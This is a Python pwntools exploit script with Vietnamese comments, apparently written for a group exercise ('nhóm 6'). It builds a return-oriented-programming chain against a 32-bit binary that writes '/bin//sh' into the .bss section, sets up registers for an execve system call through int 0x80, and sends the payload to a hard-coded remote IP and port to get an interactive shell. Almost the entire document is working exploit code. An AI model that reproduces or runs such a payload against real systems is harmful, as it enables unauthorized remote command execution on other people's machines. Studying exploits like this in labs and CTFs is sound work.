from pwn import *

# các tham số cần cho lệnh execev, ta cần có eax,ebx,ecx,edx cho system call này

#0x080a8e36 : pop eax ; ret
#0x080481c9 : pop ebx ; ret
#0x08056334 : pop eax ; pop edx ; pop ebx ; ret
pop_eax = p32(0x080a8e36)
pop_ebx = p32(0x080481c9)
pop_eax_3 = p32(0x08056334) # thay đổi giá trị edx and ebx

# để vừa khích có ecx khi không có lệnh pop ecx ret riêng, dùng gadget bên dưới
#0x0806ee91 : pop edx ; pop ecx ; pop ebx ; ret
pop_edx_ecx_ebx_ret = p32(0x0806ee91)
#0x0806ee6b : pop edx ; ret
pop_edx = p32(0x0806ee6b)

#0x080481b2 : ret
ret = p32(0x080481b2)

# đặt edx=0
#0x08056420 : xor eax, eax ; ret
#0x0806abac : xchg eax, edx ; ror byte ptr [edi], 0x94 ; ret
set_edx_to_zero_destroy_edi_content = p32(0x08056420) + p32(0x0806abac)

#lưu gadget
#0x08064794 : mov dword ptr [edx], eax ; mov eax, edx ; ret
write_eax_to_edx_ptr = p32(0x08064794)

#thực thi syscall
#0x0806f79f : nop ; int 0x80
int80 = p32(0x0806f7a0)

BSS_ADDR = p32(0x080db320) 
BSS_ADDR_PLUS_4 = p32(0x080db320 + 4)
BSS_ADDR_PLUS_16 = p32(0x080db320 + 16)
BSS_ADDR_PLUS_16_PLUS_4 = p32(0x080db320 + 16 + 4)

payload = 'A'*28 #space đã tìm trước đó

#ECX là một trường hợp đặc biệt, pop-ing phá hủy một số thanh ghi, cần thiết lập cái này trước
payload += pop_edx_ecx_ebx_ret
payload += 'B'*4
payload += BSS_ADDR_PLUS_16 # lưu ptr pointing vào .bss
                         
payload += 'C'*4

# bắt đầu ghi /bin/sh vào bss 
payload += pop_eax_3 # ret, destroy ebx và edx
payload += "/bin" # dword
payload += 'X'*8 # balance

payload += pop_edx # edx nên trỏ tới
payload += BSS_ADDR # BSS_ADDR
payload += write_eax_to_edx_ptr

payload += pop_eax_3 #ret
payload += "//sh" # dword, cần 4 kí tự và execve bỏ qua /
payload += 'X'*8 # balance

payload += pop_edx # edx nên trỏ tới
payload += BSS_ADDR_PLUS_4 # BSS_ADDR + 4
payload += write_eax_to_edx_ptr

# wsao chép /bin//sh vào .bss
# tạo 1 ptr sau khi trỏ tới
# phần bắt đầu của string

payload += pop_eax_3
payload += BSS_ADDR # địa chỉ của phần tử đầu của string "/bin//sh"
payload += 'X'*8 # balance

payload += pop_edx
payload += BSS_ADDR_PLUS_16 # lưu ở đây
payload += write_eax_to_edx_ptr



payload += pop_eax_3
payload += p32(0x0)
payload += 'X'*8 # balance

payload += pop_edx
payload += BSS_ADDR_PLUS_16_PLUS_4
payload += write_eax_to_edx_ptr

#  setup register cho execvp

# đầu tiên là eax, bởi vì nó phá hủy register
# EAX: 0x0b
payload += pop_eax_3
payload += p32(0x0b)
payload += 'X'*8


# EDX=0
payload += pop_edx
payload += p32(0x0)

# EBX: ptr trỏ tới string /bin//sh
payload += pop_ebx
payload += BSS_ADDR

#thực thi syscall
payload += int80
#thực thi hàm main và gửi payload đi
payload += p32(0x080488dd) # main
p=remote("45.122.249.68",10007)#địa chỉ ip và port của server cần exploit cho nhóm 6
p.sendline(payload)
p.interactive()